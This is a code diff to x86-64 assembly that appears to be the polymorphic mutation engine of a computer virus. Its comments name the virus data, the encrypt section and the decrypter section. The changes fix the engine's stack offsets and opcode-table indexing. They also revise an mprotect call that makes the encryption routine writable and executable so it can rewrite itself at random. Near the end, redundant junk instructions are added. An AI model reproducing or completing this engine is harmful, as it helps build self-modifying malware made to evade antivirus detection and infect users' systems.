@@ -8,8 +8,8 @@ extern rand
 %define OPCODE_XOR     0x31
 
 section .data
-
-	ModRegRM  dd 0xCB, 0xD8, 0xC1, 0xC8, 0xD0, 0xD1, 0xD9, 0xC2, 0xCA, 0xDA, 0xC3, 0xD3
+	align 8
+	ModRegRM  db 0xCB, 0xD8, 0xC1, 0xC8, 0xD0, 0xD1, 0xD9, 0xC2, 0xCA, 0xDA, 0xC3, 0xD3
 
 section .text
 
@@ -18,7 +18,7 @@ morph_engine:
 ;create stack frame
 push rbp
 mov  rbp, rsp
-sub  rsp, 0x28
+sub  rsp, 0x30
 push rbx
 push r12
 push r13
@@ -26,29 +26,49 @@ push r14
 push r15
 
 ;save data of using registers
-mov [rbp-0x28], rdi ; virus data
-mov [rbp-0x20], rsi ; offset of encrypt section
-mov [rbp-0x18],	rdx ; size of virus in hexa
-mov [rbp-0x10],	rcx ; offset of decrypter section
+mov [rbp-0x30], rdi ; virus data
+mov [rbp-0x28], rsi ; offset of encrypt section
+mov [rbp-0x20],	rdx ; size of virus in hexa
+mov [rbp-0x18],	rcx ; offset of decrypter section
 
 
 
-; do stuff here
-call getpagesize
-; rax has 0x1000
-mov rcx, rax
-; save rax for later use when passing to mprotect
-sub	rcx, 0x1
-not rcx
-mov	rdi, .encryption_function
-and rdi, rcx
-; AND them and the result will be stored in rcx
-; rdi must hold the page_start address
-mov rsi, rax
-; rsi must have the page length
-mov rdx, 0x7
-; read+write+exec = 0x7
-call mprotect
+; ; do stuff here
+; call getpagesize
+; ; rax has 0x1000
+; mov rcx, rax
+; ; save rax for later use when passing to mprotect
+; sub	rcx, 0x1
+; not rcx
+; mov	rdi, .encryption_function
+; and rdi, rcx
+; ; AND them and the result will be stored in rcx
+; ; rdi must hold the page_start address
+; mov rsi, rax
+; ; rsi must have the page length
+; mov rdx, 0x7
+; ; read+write+exec = 0x7
+; call mprotect
+
+
+	; unprotect the encryption function buffer from write operations
+	call    getpagesize
+	mov     rcx, rax
+	sub     rcx, 1
+	mov     rdi, .encryption_function
+	mov     rsi, FUNC_SIZE
+	mov     rax, rdi
+	add     rsi, rcx
+	not     rcx
+	and     rdi, rcx
+	sub     rax, rdi
+	add     rsi, rax
+	and     rsi, rcx
+	mov     [rbp-0x10], rdi
+	mov     [rbp-0x8 ], rsi
+	mov     edx, 0x7
+	call    mprotect
+
 
 
 
@@ -58,8 +78,8 @@ mov rbx, .encryption_function
 add rbx, FUNC_SIZE
 sub rbx, 0x1
 ; must use rbx here because rbx is the only one that will not change on rand call later
-mov r13, [rbp-0x28]
-add r13, [rbp-0x10] 
+mov r13, [rbp-0x30]
+add r13, [rbp-0x18] 
 add r13, FUNC_SIZE
 ; end of 
 mov r15, ModRegRM
@@ -94,7 +114,7 @@ mov r15, ModRegRM
 
 	sub r13, 0x2
 	xor rax, rax
-	mov al, [r15+rdx*4]
+	mov al, [r15+rdx]
 	; this will always result in and address that contains an modregrm opcode
 	xor rcx, rcx
 	mov ch, al
@@ -124,7 +144,7 @@ mov r15, ModRegRM
 
 	sub r13, 0x2
 	xor rax, rax
-	mov al, [r15+rdx*4]
+	mov al, [r15+rdx]
 	; this will always result in and address that contains an modregrm opcode
 	xor rcx, rcx
 	mov ch, al
@@ -139,17 +159,23 @@ mov r15, ModRegRM
 
 .encrypt_function_load_values:
 
+	; ; protect the encryption function buffer from write operations
+	; mov     rdi, [rbp-0x10]
+	; mov     rsi, [rbp-0x8 ]
+	; mov     edx, 0x5
+	; call    mprotect
+
 	; call decrypt engine
-	mov rdi, [rbp-0x28]
-	add rdi, [rbp-0x20]
-	mov rsi, [rbp-0x18]
+	mov rdi, [rbp-0x30]
+	add rdi, [rbp-0x28]
+	mov rsi, [rbp-0x20]
 	call work_engine
 
-	mov rbx, [rbp-0x28]
-	mov rsi, [rbp-0x20]
+	mov rbx, [rbp-0x30]
+	mov rsi, [rbp-0x28]
 	add rsi, rbx
 	; rsi = full address of virus.start
-	mov rdi, [rbp-0x18]
+	mov rdi, [rbp-0x20]
 	add rdi, rsi
 	; rdi = full address of the virus.end
 
@@ -174,11 +200,16 @@ mov r15, ModRegRM
 	;compare if rsi = rdi, signalling end of decryption
 	jne .encryption_loop
 
-
-
-
+	xor rax,rax 
 xor rax,rax 
-; this will ensure rax = 0 , means completed without error
+	xor rax,rax 
+xor rax,rax 
+	xor rax,rax 
+xor rax,rax 
+	xor rax,rax 
+	; this will ensure rax = 0 , means completed without error
+
+
 pop r15
 pop r14
 pop r13
